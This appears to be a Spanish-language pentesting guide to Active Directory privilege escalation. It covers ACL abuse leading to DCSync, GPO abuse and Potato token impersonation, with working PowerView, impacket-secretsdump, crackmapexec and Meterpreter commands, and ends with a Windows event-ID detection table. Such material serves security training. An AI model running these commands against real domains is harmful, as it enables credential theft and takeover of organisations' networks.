# Escalada de Privilegios en Active Directory

Una vez con acceso a una cuenta de usuario estándar o de servicio,
el objetivo es obtener privilegios de Domain Admin.

---

## ACL Abuse — Abuso de listas de control de acceso (T1222)

Los objetos AD tienen ACLs que definen qué usuarios pueden hacer qué.
Errores de configuración frecuentes dan privilegios excesivos.

### Permisos peligrosos más comunes

| Permiso | Sobre qué objeto | Qué permite al atacante |
|---------|-----------------|------------------------|
| **GenericAll** | Usuario | Cambiar contraseña, añadir SPN |
| **GenericAll** | Grupo | Añadirse como miembro |
| **GenericWrite** | Usuario | Modificar atributos, añadir SPN → Kerberoasting |
| **WriteDACL** | Dominio | Concederse DCSync |
| **WriteOwner** | Cualquiera | Tomar control total |
| **ForceChangePassword** | Usuario | Cambiar contraseña sin conocer la actual |

### Enumeración de ACLs con BloodHound

```bash
# Recopilar datos del dominio
bloodhound-python -d empresa.local -u juan.garcia -p "Password123!" \
    -ns 192.168.1.10 -c All

# Importar los JSON en BloodHound
# Queries útiles:
# → "Find Shortest Paths to Domain Admins"
# → "Find Principals with DCSync Rights"
# → "Shortest Path from Owned Principals"
```

### Ejemplo — GenericAll sobre un usuario

```powershell
# Verificar permisos (desde Windows con PowerView)
Get-ObjectAcl -SamAccountName "objetivo" -ResolveGUIDs | 
    Where-Object {$_.ActiveDirectoryRights -match "GenericAll"}

# Cambiar contraseña del objetivo si tenemos GenericAll
Set-ADAccountPassword -Identity objetivo \
    -NewPassword (ConvertTo-SecureString "NuevaPass123!" -AsPlainText -Force)
```

### Ejemplo — WriteDACL sobre el dominio → DCSync

```powershell
# Desde Windows con PowerView — dar privilegios DCSync a un usuario controlado
Add-ObjectACL -PrincipalIdentity juan.garcia \
    -Rights DCSync -TargetIdentity "DC=empresa,DC=local"

# Ahora juan.garcia puede hacer DCSync
impacket-secretsdump empresa.local/juan.garcia:"Password123!"@192.168.1.10 -just-dc-ntlm
```

---

## GPO Abuse (T1484.001)

Las Group Policy Objects controlan la configuración de equipos y usuarios.
Si tenemos permisos de escritura sobre una GPO aplicada a una OU con equipos,
podemos ejecutar código en esos equipos.

```bash
# Enumerar GPOs y sus permisos
crackmapexec smb 192.168.1.10 -u juan.garcia -p "Password123!" --gpo

# Con PowerView desde Windows
Get-GPO -All | Get-GPPermission -TargetName "juan.garcia" -TargetType User
```

---

## SeImpersonatePrivilege — Potato Attacks (T1134)

Si una cuenta de servicio tiene `SeImpersonatePrivilege`, se puede
escalar a SYSTEM mediante los ataques Potato.

```bash
# Verificar el privilegio (desde sesión en el objetivo)
whoami /priv | findstr Impersonate

# Si aparece SeImpersonatePrivilege → usar PrintSpoofer o GodPotato
# Desde Meterpreter:
load incognito
list_tokens -u
impersonate_token "NT AUTHORITY\\SYSTEM"
```

---

## Detección

| Técnica | Event ID | Indicador |
|---------|----------|-----------|
| ACL Abuse | 4662 | Acceso a objeto con permisos inusuales |
| GPO Abuse | 5136 | Modificación de atributo de objeto |
| Impersonation | 4624 | Logon Type 3 desde cuentas de servicio |
